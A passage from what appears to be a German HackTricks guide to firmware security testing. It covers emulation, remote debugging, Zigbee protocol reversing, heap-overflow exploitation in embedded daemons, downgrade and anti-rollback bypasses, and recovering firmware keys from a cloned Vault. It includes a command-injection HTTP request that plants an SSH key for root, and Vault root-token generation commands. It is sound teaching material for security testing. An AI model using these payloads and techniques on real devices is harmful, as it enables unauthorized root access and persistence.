  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Offline-Debugging des Image-Zustands

Untersuche den persistenten Zustand außerhalb des Gasts, wenn langsame Boots, destruktive Startskripte oder unzuverlässige Konsolenprotokolle die Fehlerursache verschleiern. Binde niemals ein Overlay ein, das von einer laufenden VM verwendet wird; mache es mit `qemu-nbd` zugänglich, beschränke die LVM-Erkennung auf die vorgesehene NBD-Partition und deaktiviere die Volume Group, bevor du die Verbindung trennst.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Zur reproduzierbaren Fehlerisolation sollten zeitgestempelte Markerdateien auf einem stabilen, beschreibbaren Volume gespeichert und offline überprüft werden; `/dev/kmsg`, FIFOs und flüchtige Konsolen können durch Rate-Limiting oder den vorzeitigen Prozessabbruch zu falsch-negativen Ergebnissen führen. Vergleiche außerdem exakte Schnittstellen über verschiedene Schichten hinweg, bevor du nicht zusammenhängenden Code änderst: `uname -r` mit `/lib/modules/`, ext4-Funktionen auf dem Datenträger mit der Kernel-Konfiguration und die Mesa-`libGL`-Generation mit der DRI-Treiber-ABI sowie den aus der PCI-ID abgeleiteten Treibernamen. Eine Komponente kann vorhanden sein und sogar erfolgreich per `dlopen()` geladen werden, aber dennoch unbrauchbar bleiben, weil ihr Consumer eine andere ABI erwartet.<sup>[[11]](#references)</sup>

## Dynamische Analyse in der Praxis

In dieser Phase wird für die Analyse entweder eine echte oder eine emulierte Geräteumgebung verwendet. Der Shell-Zugriff auf das Betriebssystem und das Dateisystem muss unbedingt erhalten bleiben. Die Emulation bildet die Hardwareinteraktionen möglicherweise nicht perfekt nach, sodass gelegentliche Neustarts der Emulation erforderlich sind. Bei der Analyse sollten das Dateisystem erneut untersucht, exponierte Webseiten und Netzwerkdienste ausgenutzt und Bootloader-Schwachstellen untersucht werden. Firmware-Integritätstests sind entscheidend, um mögliche Hintertür-Schwachstellen zu erkennen.

## Techniken der Laufzeitanalyse

Bei der Laufzeitanalyse wird mit einem Prozess oder einer Binärdatei in ihrer Laufzeitumgebung interagiert. Dazu werden Tools wie gdb-multiarch, Frida und Ghidra verwendet, um Breakpoints zu setzen und durch Fuzzing sowie andere Techniken Schwachstellen zu identifizieren.

Bei Embedded-Zielen ohne vollständigen Debugger **kopiere einen statisch gelinkten `gdbserver`** auf das Gerät und verbinde dich remote:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee-/Radio-Co-Prozessor-Nachrichten-Mapping

Bei IoT-Hubs ist der RF-Stack häufig auf einen **Radio-MCU** und einen Linux-Userland-Prozess aufgeteilt. Ein nützlicher Workflow ist, den Pfad nachzuverfolgen:<sup>[[8]](#references)</sup>

1. **RF-Frame** über Funk
2. **Controller-seitiger Parser** auf dem Radio-MCU
3. **Serielles/UART-Text- oder TLV-Protokoll**, das an Linux weitergeleitet wird (zum Beispiel `/dev/tty*`)
4. **Application-Dispatcher** im Haupt-Daemon
5. **Protokollspezifischer Handler / Zustandsautomat**

Diese Architektur schafft zwei Reverse-Engineering-Ziele statt einem. Wenn der Controller binäre Funk-Frames in ein Textprotokoll wie `Group,Command,arg1,arg2,...` umwandelt, ermitteln Sie:

- Die **Nachrichtengruppen** und Dispatch-Tabellen
- Welche Nachrichten vom **Netzwerk** kommen können und welche vom Controller selbst
- Die exakten **herstellerspezifischen Unterscheidungsfelder** (zum Beispiel Zigbee-`manufacturer_code` und benutzerdefinierte `cluster_command`)
- Welche Handler nur während **Commissioning**, Discovery oder Firmware-/Model-Download-Phasen erreichbar sind

Speziell bei Zigbee sollten Sie Pairing-Datenverkehr mitschneiden und prüfen, ob das Ziel noch auf den standardmäßigen **Link Key** `ZigBeeAlliance09` setzt. Falls ja, kann das Mitschneiden des Commissioning-Datenverkehrs den **Network Key** offenlegen. Zigbee 3.0 Install Codes verringern diese Angriffsfläche. Halten Sie daher fest, ob das getestete Gerät sie tatsächlich erzwingt.

### Herstellerspezifische Protokoll-Handler und durch FSM eingeschränkte Erreichbarkeit

Herstellerspezifische Zigbee-/ZCL-Befehle sind oft ein besseres Ziel als standardisierte Cluster, da sie **benutzerdefinierten Parsing-Code** und interne **FSMs** mit weniger praxiserprobter Validierung ansprechen.<sup>[[8]](#references)</sup>

Praktischer Workflow:

- Untersuchen Sie den Command-Dispatcher rückwärts, bis Sie den **nur für den Hersteller bestimmten Handler** finden.
- Ermitteln Sie die Tabellen für **FSM-Zustand**, **Ereignis**, **Prüfung**, **Aktion** und **Folgezustand**.
- Identifizieren Sie **Übergangszustände**, die automatisch weiterlaufen, sowie Retry-/Fehlerzweige, die letztlich angreiferkontrollierten Zustand zurücksetzen oder freigeben.
- Stellen Sie fest, welche legitimen Protokollaustausche erforderlich sind, um den Daemon in den verwundbaren Zustand zu bringen, statt anzunehmen, der fehlerhafte Handler sei immer erreichbar.

Bei zeitkritischen Protokollen kann die Paketwiedergabe über ein Python-Framework zu langsam sein. Zuverlässiger ist es, ein legitimes Gerät auf echter Hardware (zum Beispiel einem **nRF52840**) mit einem Stack in Herstellerqualität zu emulieren, damit die korrekten **Endpunkte**, **Attribute** und das richtige Commissioning-Timing vorhanden sind.

### Fehlerklasse bei fragmentierten Downloads in eingebetteten Daemons

Eine wiederkehrende Firmware-Fehlerklasse tritt bei **fragmentierten Blob-/Modell-/Konfigurations-Downloads** auf:<sup>[[8]](#references)</sup>

1. Das **erste Fragment** (`offset == 0`) speichert `ctx->total_size` und weist `malloc(total_size)` zu.
2. Bei späteren Fragmenten werden nur die vom Angreifer kontrollierten **paketlokalen** Felder geprüft, etwa `packet_total_size >= offset + chunk_len`.
3. Der Kopiervorgang verwendet `memcpy(&ctx->buffer[offset], chunk, chunk_len)`, ohne die **ursprüngliche zugewiesene Größe** zu prüfen.

So kann ein Angreifer Folgendes senden:

- Ein gültiges erstes Fragment mit einer **kleinen** angegebenen Gesamtgröße, um eine kleine Heap-Allokation zu erzwingen.
- Ein späteres Fragment mit dem **erwarteten Offset**, aber einem größeren `chunk_len`.
- Eine gefälschte paketlokale Größe, die die erneuten Prüfungen besteht, während der ursprünglich zugewiesene Buffer dennoch überläuft.

Wenn der verwundbare Pfad hinter Commissioning-Logik liegt, muss der Exploit genügend **Geräteemulation** umfassen, um das Ziel vor dem Senden der fehlerhaften Fragmente in den erwarteten Modell-Download- oder Blob-Download-Zustand zu versetzen.

### Protokollgesteuerte `free()`-Auslöser

Bei eingebetteten Daemons lässt sich Heap-Metadaten-Ausnutzung oft am einfachsten nicht durch „Warten auf Cleanup“, sondern durch **Auslösen der protokolleigenen Fehlerbehandlung** erreichen:<sup>[[8]](#references)</sup>

- Senden Sie fehlerhafte Folgefragmente, um die FSM in **Retry-** oder **Fehlerzustände** zu bringen.
- Überschreiten Sie den Retry-Schwellwert, sodass der Daemon den **Kontext zurücksetzt** und den beschädigten Buffer freigibt.
- Nutzen Sie dieses vorhersehbare `free()`, um allocatorseitige Primitives auszulösen, bevor der Prozess aus anderen Gründen abstürzt.

Das ist besonders nützlich bei **musl/uClibc/dlmalloc-ähnlichen** Allocators in eingebettetem Linux, bei denen sich Chunk-Metadaten so beschädigen lassen, dass Unlink-/Unbin-Logik zu einem Schreib-Primitive wird. Ein stabiles Muster ist, ein **Größenfeld** so zu beschädigen, dass die Allocator-Traversierung zu **gefälschten Chunks innerhalb des übergelaufenen Buffers** umgeleitet wird, statt sofort echte Bin-Pointer zu überschreiben und den Prozess zum Absturz zu bringen.

## Binäre Ausnutzung und Proof-of-Concept

Die Entwicklung eines PoC für erkannte Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und Programmierkenntnisse in hardwarenahen Sprachen. Binäre Laufzeitschutzmechanismen sind in eingebetteten Systemen selten, doch falls vorhanden, können Techniken wie Return Oriented Programming (ROP) erforderlich sein.

### Hinweise zur uClibc-Fastbin-Ausnutzung (Embedded Linux)

- **Fastbins + Konsolidierung:** uClibc verwendet ähnlich wie glibc Fastbins. Eine spätere große Allokation kann `__malloc_consolidate()` auslösen. Daher muss jeder gefälschte Chunk Prüfungen bestehen (plausible Größe, `fd = 0` und umgebende Chunks, die als „in use“ erkannt werden).<sup>[[6]](#references)</sup>
- **Nicht-PIE-Binaries unter ASLR:** Ist ASLR aktiviert, das Haupt-Binary aber **nicht-PIE**, sind Adressen innerhalb des Binaries in `.data/.bss` stabil. Sie können einen Bereich anvisieren, der bereits einem gültigen Heap-Chunk-Header ähnelt, um eine Fastbin-Allokation auf einer **Funktionszeigertabelle** landen zu lassen.
- **NUL-Byte zum Stoppen des Parsers:** Beim Parsen von JSON kann ein `\x00` in der Payload das Parsing stoppen und gleichzeitig nachfolgende angreiferkontrollierte Bytes für einen Stack Pivot oder eine ROP-Kette erhalten.
- **Shellcode über `/proc/self/mem`:** Eine ROP-Kette, die `open("/proc/self/mem")`, `lseek()` und `write()` aufruft, kann ausführbaren Shellcode in einer bekannten Speicherabbildung platzieren und dorthin springen.

## Vorbereitete Betriebssysteme zur Firmware-Analyse

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) bieten vorkonfigurierte Umgebungen für Firmware-Sicherheitstests, die mit den erforderlichen Tools ausgestattet sind.

## Vorbereitete Betriebssysteme zur Firmware-Analyse

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine Distribution, die Sie bei der Sicherheitsbewertung und beim Penetration Testing von IoT-Geräten unterstützen soll. Sie sparen viel Zeit, da eine vorkonfigurierte Umgebung mit allen erforderlichen installierten Tools bereitgestellt wird.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Betriebssystem für Embedded-Sicherheitstests auf Basis von Ubuntu 18.04, vorinstalliert mit Tools für Firmware-Sicherheitstests.

## Firmware-Downgrade-Angriffe und unsichere Update-Mechanismen

Selbst wenn ein Hersteller kryptografische Signaturprüfungen für Firmware-Images implementiert, wird der **Schutz vor Versions-Rollbacks (Downgrades)** häufig ausgelassen. Wenn der Boot- oder Recovery-Loader die Signatur lediglich mit einem eingebetteten öffentlichen Schlüssel prüft, aber nicht die *Version* (oder einen monoton steigenden Zähler) des zu flashenden Images vergleicht, kann ein Angreifer rechtmäßig eine **ältere, verwundbare Firmware mit weiterhin gültiger Signatur** installieren und dadurch bereits behobene Schwachstellen wieder einführen.<sup>[[4]](#references)</sup>

Typischer Angriffsablauf:

1. **Ein älteres signiertes Image beschaffen**
   * Laden Sie es aus dem öffentlichen Download-Portal, CDN oder von der Support-Seite des Herstellers herunter.
   * Extrahieren Sie es aus zugehörigen Mobile-/Desktop-Anwendungen (z. B. aus `assets/firmware/` in einem Android-APK).
   * Rufen Sie es aus Drittanbieter-Repositories wie VirusTotal, Internetarchiven, Foren usw. ab.
2. **Das Image über einen beliebigen verfügbaren Update-Kanal auf das Gerät hochladen oder bereitstellen:**
   * Web-UI, Mobile-App-API, USB, TFTP, MQTT usw.
   * Viele IoT-Geräte für Verbraucher stellen *unauthentifizierte* HTTP(S)-Endpunkte bereit, die Base64-kodierte Firmware-Blobs akzeptieren, serverseitig decodieren und Recovery/Upgrade auslösen.
3. Nutzen Sie nach dem Downgrade eine Schwachstelle aus, die in der neueren Version behoben wurde (zum Beispiel einen später hinzugefügten Command-Injection-Filter).
4. Flashen Sie optional wieder das neueste Image oder deaktivieren Sie Updates, um nach Erlangen der Persistenz eine Entdeckung zu vermeiden.

### Beispiel: Command Injection nach Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In der anfälligen (herabgestuften) Firmware wird der Parameter `md5` ohne Bereinigung direkt an einen Shell-Befehl angehängt, wodurch sich beliebige Befehle einschleusen lassen (hier: um SSH-Schlüssel-basierten Root-Zugriff zu ermöglichen). Spätere Firmwareversionen führten einen einfachen Zeichenfilter ein, doch da ein Downgrade-Schutz fehlt, ist die Behebung wirkungslos.<sup>[[4]](#references)</sup>

### Firmware aus mobilen Apps extrahieren

Viele Anbieter bündeln vollständige Firmware-Images in ihren mobilen Begleit-Apps, damit die App das Gerät über Bluetooth/Wi-Fi aktualisieren kann. Diese Pakete sind im APK/APEX häufig unverschlüsselt unter Pfaden wie `assets/fw/` oder `res/raw/` gespeichert. Mit Tools wie `apktool`, `ghidra` oder sogar einfachem `unzip` lassen sich signierte Images extrahieren, ohne die physische Hardware anzurühren.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Updater-only-Bypass des Anti-Rollback-Schutzes in A/B-Slot-Designs

Einige Hersteller implementieren zwar einen Anti-Downgrade-**Ratchet**, aber nur innerhalb der *Updater*-Logik (zum Beispiel eine UDS-Routine über CAN, einen Recovery-Befehl oder einen OTA-Agent im Userspace). Wenn der **Bootloader** später nur die Image-Signatur/CRC prüft und der Partitionstabelle oder den Slot-Metadaten vertraut, kann der Rollback-Schutz weiterhin umgangen werden.<sup>[[7]](#references)</sup>

Typisches schwaches Design:

- Die Firmware-Metadaten enthalten sowohl einen Versionsdeskriptor als auch einen **Security-Ratchet** / monotonen Zähler.
- Der Updater vergleicht den Image-Ratchet mit einem Wert im persistenten Speicher und weist ältere signierte Images zurück.
- Der Bootloader **parst** diesen Ratchet nicht und prüft vor dem Booten des ausgewählten Slots nur Header, CRC und Signatur.
- Die Slot-Aktivierung wird separat in einer Partitionstabelle oder einem generationsbasierten Zähler pro Slot gespeichert und ist **nicht kryptografisch an den exakten Digest der validierten Firmware gebunden**.

Dadurch entsteht in Dual-Slot-Systemen ein Primitiv nach dem Muster **ein Image validieren / ein anderes Image booten**. Wenn der Angreifer den Updater dazu bringen kann, Slot B mithilfe eines aktuellen signierten Images als nächstes Boot-Ziel zu markieren, und Slot B anschließend vor dem Neustart überschreiben kann, bootet der Bootloader möglicherweise trotzdem das Downgrade-Image, da er nur den bereits festgeschriebenen Slot-Metadaten vertraut.

Häufiges Missbrauchsmuster:

1. Eine **aktuelle signierte** Firmware in den passiven Slot hochladen und die normale Validierungs-/Umschaltroutine ausführen, damit das Layout diesen Slot als nächstes aktiv markiert.
2. **Noch nicht neu starten**. In derselben Sitzung die Slot-Vorbereitungs-/Löschroutine erneut aufrufen.
3. Veraltete Boot-Status- oder Slot-Auswahllogik ausnutzen, sodass der Updater **denselben physischen Slot** löscht, der gerade aktiviert wurde.
4. Eine **ältere, aber weiterhin signierte** Firmware in diesen Slot schreiben.
5. Die Validierungsroutine, die den Ratchet durchsetzt, überspringen und direkt neu starten.
6. Der Bootloader wählt den aktivierten Slot aus, prüft nur Signatur/Integrität und bootet das alte Image.

Bei der Analyse von A/B-Update-Implementierungen sollte man auf Folgendes achten:

- Slot-Auswahl anhand von **Boot-Zeit-Flags**, die nach einer erfolgreichen Umschaltung nicht aktualisiert werden.
- Eine Routine nach Art von `prepare_passive_slot()`, die anhand veralteten Status einen Slot löscht, statt das **aktuelle festgeschriebene Layout** zu verwenden.
- Eine Funktion nach Art von `part_write_layout()`, die lediglich einen **Generationszähler** / ein Aktiv-Flag erhöht und den Hash des validierten Images nicht speichert.
- Ratchet-Prüfungen, die im Userspace oder im Updater-Code implementiert sind, aber **nicht** in ROM / Bootloader / Secure-Boot-Stufen.
- Lösch- oder Recovery-Routinen, die den Slot weiterhin als bootfähig markieren, obwohl sein Inhalt gelöscht und neu geschrieben wurde.

### Checkliste zur Bewertung der Update-Logik

* Ist die Übertragung/Authentifizierung des *Update-Endpunkts* ausreichend geschützt (TLS + Authentifizierung)?
* Vergleicht das Gerät vor dem Flashen **Versionsnummern** oder einen **monotonen Anti-Rollback-Zähler**?
* Wird das Image innerhalb einer Secure-Boot-Kette verifiziert (z. B. werden Signaturen durch ROM-Code geprüft)?
* Setzt der **Bootloader denselben Ratchet** wie der Updater durch, statt nur Signatur/CRC zu prüfen?
* Sind die Metadaten zur Slot-Aktivierung **an den validierten Firmware-Digest/die Version gebunden**, oder kann ein Slot nach seiner Aktivierung verändert werden?
* Erzwingt das Gerät nach einer erfolgreichen Slot-Umschaltung einen Neustart, oder sind spätere Update-/Löschroutinen in derselben Sitzung weiterhin erreichbar?
* Führt der Userland-Code zusätzliche Plausibilitätsprüfungen durch (z. B. zulässige Partitionszuordnung, Modellnummer)?
* Verwenden *partielle* oder *Backup*-Update-Abläufe dieselbe Validierungslogik?

> 💡  Fehlt einer der oben genannten Punkte, ist die Plattform wahrscheinlich anfällig für Rollback-Angriffe.

## Verwundbare Firmware zum Üben

Um das Auffinden von Schwachstellen in Firmware zu üben, dienen die folgenden Projekte mit verwundbarer Firmware als Ausgangspunkt.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Wiederherstellung von Firmware-Entschlüsselungsschlüsseln aus eingebettetem KMS-/Vault-Status

Wenn ein Update-Image kleine Metadaten im Klartext mit einem großen Blob hoher Entropie kombiniert, sollte vor jedem Brute-Force-Versuch zunächst eine Container-Triage erfolgen:<sup>[[1]](#references)</sup>

- Header, Offsets und Zeilengrenzen mit `hexdump`, `xxd`, `strings -tx`, `base64 -d` und `binwalk -E` ausgeben.
- `Salted__` weist üblicherweise auf das OpenSSL-`enc`-Format hin: Die nächsten 8 Bytes sind der Salt, die übrigen Bytes der Ciphertext.
- Ein Base64-Feld, das zu exakt `256` Bytes dekodiert wird, ist ein deutlicher Hinweis auf einen RSA-2048-Ciphertext, der ein zufälliges Firmware-Passwort/einen Session-Key umschließt.
- Separates PGP-Material in derselben Datei schützt oft nur die Authentizität; nicht davon ausgehen, dass es zur Verschlüsselung dient.

Wenn die Suche nach statischen Schlüsseln (`grep`, `strings`, PEM-/PGP-Suchen) erfolglos bleibt, sollte stattdessen der **operative Entschlüsselungspfad** analysiert werden, anstatt nur nach privaten Schlüsseln zu suchen:

- Den Updater / die Management-Binärdatei dekompilieren und nachvollziehen, wer den verschlüsselten Blob liest, welcher Helfer/API ihn entschlüsselt und welchen logischen Schlüsselnamen die Funktion anfordert.
- Das extrahierte Root-Dateisystem nach KMS-Status durchsuchen (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) sowie nach Unit-Dateien und Init-Skripten.
- Klartextbefehle wie `vault operator unseal ...`, Recovery-Keys, Bootstrap-Tokens oder lokale KMS-Auto-Unseal-Skripte als gleichwertig mit privatem Schlüsselmaterial behandeln.

Wenn das Gerät die originale Vault-Binärdatei und das Storage-Backend enthält, ist es in der Regel einfacher, diese Umgebung nachzubilden, als die internen Abläufe von Vault neu zu implementieren:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Mit Root-Zugriff auf dem geklonten KMS:

- Transit-Schlüssel nur innerhalb des isolierten Klons exportierbar machen: `vault write transit/keys/<name>/config exportable=true`
- Den Unwrap-Schlüssel exportieren: `vault read transit/export/encryption-key/<name>`
- Den wiederhergestellten RSA-Schlüssel mit exakt dem Padding-/Hash-Paar testen, das vom KMS verwendet wird. Eine fehlgeschlagene PKCS#1-v1.5-Entschlüsselung und eine fehlgeschlagene Standard-OAEP-Entschlüsselung beweisen **nicht**, dass der Schlüssel falsch ist. Viele Vault-gestützte Abläufe verwenden OAEP mit SHA-256, während gängige Bibliotheken standardmäßig SHA-1 verwenden.
- Beginnt die Payload mit `Salted__`, muss vor dem Versuch einer AES-CBC-Entschlüsselung die OpenSSL-KDF des Herstellers exakt reproduziert werden (`EVP_BytesToKey`, bei älteren Geräten häufig MD5).

Damit wird „verschlüsselte Firmware“ zu einem allgemeineren Problem: **Die betrieblichen Schlüssel auf Appliance-Seite wiederherstellen und anschließend die exakten Unwrap- und KDF-Parameter offline reproduzieren.**

## Schulungen und Zertifizierungen

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Firmware mit Claude knacken: Fähigkeiten auf Senior-Niveau, Autonomie auf Junior-Niveau](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Methodik für Firmware-Sicherheitstests](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktisches IoT-Hacking: Der maßgebliche Leitfaden zum Angriff auf das Internet der Dinge](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Zero-Days in aufgegebener Hardware ausnutzen – Trail of Bits-Blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Wie mir ein 20-Dollar-Smartgerät Zugriff auf Ihr Zuhause verschaffte](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Jetzt siehst du mi: Jetzt bist du pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv – Den Tesla Wall Connector über seinen Ladeanschluss ausnutzen – Teil 2: Die Anti-Downgrade-Schutzmaßnahme umgehen](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Zum Blinken bringen: Over-the-Air-Ausnutzung der Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [Tesla OS auf QEMU rooten, Teil 1: Entpacken](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux-Kernel-Dokumentation – dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [Tesla OS auf QEMU rooten, Teil 2: Debugging und Fehlerbehebung](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell-BIOS-Passwörter: Schwache XOR-Verschlüsselung ermöglicht Wiederherstellung aus dem SPI-Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn – Tools zur Wiederherstellung von Dell-BIOS-Passwörtern](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
